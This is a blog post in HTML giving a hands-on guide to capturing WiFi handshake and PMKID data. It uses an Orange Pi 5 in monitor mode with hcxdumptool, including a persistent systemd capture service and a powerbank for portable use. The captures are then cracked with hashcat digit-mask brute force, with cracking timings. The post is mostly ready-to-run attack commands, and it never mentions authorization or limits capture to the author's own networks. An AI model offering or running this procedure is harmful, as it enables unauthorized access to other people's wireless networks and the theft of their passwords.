<!doctype html><html lang=ru><head><title>Simple WiFi pentest :: Всякое</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Simple WiFi pentest"><meta name=keywords content="wifi,kali,gentoo,orange pi5"><meta name=robots content="noodp"><link rel=canonical href=/posts/wifi-pentest/><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z5MR5322PH"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z5MR5322PH",{anonymize_ip:!1})}</script><link rel=stylesheet href=/styles.css><link rel="shortcut icon" href=/img/theme-colors/orange.png><link rel=apple-touch-icon href=/img/theme-colors/orange.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="ru"><meta property="og:type" content="article"><meta property="og:title" content="Simple WiFi pentest"><meta property="og:description" content="Simple WiFi pentest"><meta property="og:url" content="/posts/wifi-pentest/"><meta property="og:site_name" content="Всякое"><meta property="og:image" content="/"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2023-11-16 20:36:04 +0400 +0400"></head><body class=orange><div class="container headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Всякое</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/about>About</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/about>About</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=/posts/wifi-pentest/>Simple WiFi pentest</a></h1><div class=post-meta><time class=post-date>2023-11-16 ::
[Updated :: 2023-11-26]
</time><span class=post-author>gals</span>
<span class=post-reading-time>:: 2 min read (361 words)</span></div><span class=post-tags>#<a href=/tags/wifi/>wifi</a>&nbsp;
#<a href=/tags/kali/>kali</a>&nbsp;
#<a href=/tags/gentoo/>gentoo</a>&nbsp;
#<a href=/tags/orange-pi5/>orange pi5</a>&nbsp;</span><div class=post-content><div><h1 id=simple-wifi-pentest>Simple WiFi pentest<a href=#simple-wifi-pentest class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=hardware>Hardware<a href=#hardware class=hanchor arialabel=Anchor>&#8983;</a></h2><h3 id=orange-pi-5--tp-link-archer-t2u-plus-rtl8821au>Orange Pi 5 + TP-Link Archer T2U PLUS [RTL8821AU]<a href=#orange-pi-5--tp-link-archer-t2u-plus-rtl8821au class=hanchor arialabel=Anchor>&#8983;</a></h3><p>The OS is <a href=https://github.com/leeboby/kali-images>Kali Linux</a>. Don&rsquo;t forget to do <code>rm /boot/*cloud-arm64* && /usr/sbin/u-boot-update</code> after <code>apt update && apt upgrade</code> otherwise you can&rsquo;t boot after reboot. In my case, the main reason for the appearance incorrect kernel is <code>apt install wireguard</code>. As you can see</p><pre tabindex=0><code>└─# apt depends wireguard
wireguard
 |Depends: &lt;wireguard-modules&gt; (&gt;= 0.0.20191219)
    linux-image-arm64
    linux-image-cloud-arm64
</code></pre><p>you can use it in any place with powerbank.</p><h3 id=some-computer-with-video-card>Some computer with video card<a href=#some-computer-with-video-card class=hanchor arialabel=Anchor>&#8983;</a></h3><p>In my case it&rsquo;s Gentoo with GeForce RTX 3070 Lite Hash Rate</p><h2 id=orange-pi-5>Orange PI 5<a href=#orange-pi-5 class=hanchor arialabel=Anchor>&#8983;</a></h2><h3 id=prepare>Prepare<a href=#prepare class=hanchor arialabel=Anchor>&#8983;</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>apt update
</span></span><span style=display:flex><span>apt install tshark hcxdumptool hcxtools iw bettercap
</span></span></code></pre></div><h3 id=exclude-wlan0-from-nodemanager>Exclude wlan0 from NodeManager<a href=#exclude-wlan0-from-nodemanager class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Update <code>/etc/NetworkManager/NetworkManager.conf</code> and restart NetworkManager</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#66d9ef>[main]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>plugins</span><span style=color:#f92672>=</span><span style=color:#e6db74>ifupdown,keyfile</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>[ifupdown]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>managed</span><span style=color:#f92672>=</span><span style=color:#e6db74>false</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>[keyfile]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>unmanaged-devices</span><span style=color:#f92672>=</span><span style=color:#e6db74>interface-name:wlan0</span>
</span></span></code></pre></div><h3 id=run>Run<a href=#run class=hanchor arialabel=Anchor>&#8983;</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Setup monitor mode</span>
</span></span><span style=display:flex><span>ip link set wlan0 down <span style=color:#f92672>&amp;&amp;</span> iw wlan0 set monitor none <span style=color:#f92672>&amp;&amp;</span> ip link set wlan0 up
</span></span><span style=display:flex><span><span style=color:#75715e># Run tool for hcxdumptool 6.3.1 (C) 2023 ZeroBeat</span>
</span></span><span style=display:flex><span>hcxdumptool -i wlan0 -w wlan0.pcapng
</span></span><span style=display:flex><span><span style=color:#75715e># wait</span>
</span></span></code></pre></div><p>You can use systemd service like this</p><pre tabindex=0><code>[Unit]
Description=WiFi scan

[Service]
Type=simple
Environment=TERM=xterm
ExecStartPre=/usr/bin/ip link set wlan0 down
ExecStartPre=/usr/sbin/iw wlan0 set monitor none
ExecStartPre=/usr/bin/ip link set wlan0 up
ExecStartPre=-/usr/bin/bash -c &#39;/usr/bin/mv /var/log/wifi-dump/wlan0.pcapng /var/log/wifi-dump/wlan0-$(date +%%Y%%m%%d-%%H%%M%%S).pcapng&#39;
ExecStart=bash -c &#39;TERM=xterm; /usr/bin/hcxdumptool -i wlan0 -w /var/log/wifi-dump/wlan0.pcapng&#39;
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
</code></pre><p>After or during waiting</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Dump to hc22000 file format, watch into &#39;PMKID (best)&#39;</span>
</span></span><span style=display:flex><span>hcxpcapngtool -o wlan0.hc22000 wlan0.pcapng
</span></span><span style=display:flex><span><span style=color:#75715e># Get info from wlan0.hc22000</span>
</span></span><span style=display:flex><span>hcxhashtool -i wlan0.hc22000 --info<span style=color:#f92672>=</span>stdout
</span></span></code></pre></div><p>You can run something like this <code>bettercap -iface wlan0 -eval 'wifi.recon on; set ticker.period 5; set ticker.commands "wifi.show"; ticker on'</code> at the same time for watching in real time.</p><h2 id=gentoo>Gentoo<a href=#gentoo class=hanchor arialabel=Anchor>&#8983;</a></h2><h3 id=prepare-1>Prepare<a href=#prepare-1 class=hanchor arialabel=Anchor>&#8983;</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>eselect repository enable pentoo
</span></span><span style=display:flex><span>eix-sync
</span></span><span style=display:flex><span>eix-update
</span></span><span style=display:flex><span>emerge hcxtools
</span></span></code></pre></div><h3 id=try-to-find-something-interesting>Try to find something interesting<a href=#try-to-find-something-interesting class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Simple ans stupid brute force with all digest from 000000000 (minimal wifi password length) to 999999999999 (like mobile phone number)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>hashcat -m <span style=color:#ae81ff>22000</span> wlan0.hc22000 -a3 --increment -w3 <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  --increment-max <span style=color:#ae81ff>11</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  --increment-min <span style=color:#ae81ff>8</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  <span style=color:#e6db74>&#39;?d?d?d?d?d?d?d?d?d?d?d&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># press s to check status</span>
</span></span><span style=display:flex><span><span style=color:#75715e># run any time if you want get current status with the found</span>
</span></span><span style=display:flex><span>hashcat -m <span style=color:#ae81ff>22000</span> wlan0.hc22000 --show
</span></span></code></pre></div><p><strong>Timings:</strong></p><ul><li>8 digits ~ 18 minutes</li><li>9 digits ~ 3 hours</li><li>10 digits ~ 1 day, 5 hours</li><li>11 digist ~ 12 days, 9 hours</li></ul></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Читать другие посты</span><hr></div><div class=pagination__buttons><span class="button next"><a href=/posts/ender-5-pro-marlin/><span class=button__text>Сборка Marlin 2.x для Ender 5 Pro</span>
<span class=button__icon>→</span></a></span></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2023 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>